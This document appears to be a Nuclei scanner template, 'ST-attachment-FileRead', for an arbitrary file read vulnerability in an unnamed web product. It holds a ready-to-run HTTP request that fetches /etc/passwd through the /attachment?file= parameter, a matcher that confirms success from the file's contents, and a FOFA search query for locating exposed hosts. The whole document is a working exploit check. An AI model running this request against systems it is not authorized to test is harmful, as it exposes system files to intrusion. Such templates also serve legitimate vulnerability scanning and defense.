id: ST-attachment-FileRead

info:
  name: ST-attachment-FileRead
  author: lengmo
  severity: high
  description: ST-attachment-FileRead
  tags: FileRead
  metadata:
    fofa-qeury: body="/system/get_rtc_user_defined_info?site_id"
    veified: true
    max-request: 1

http:
  - raw:
      - |
        GET /attachment?file=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close


               
    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && contains_all(body,'root','bin','daemon')" 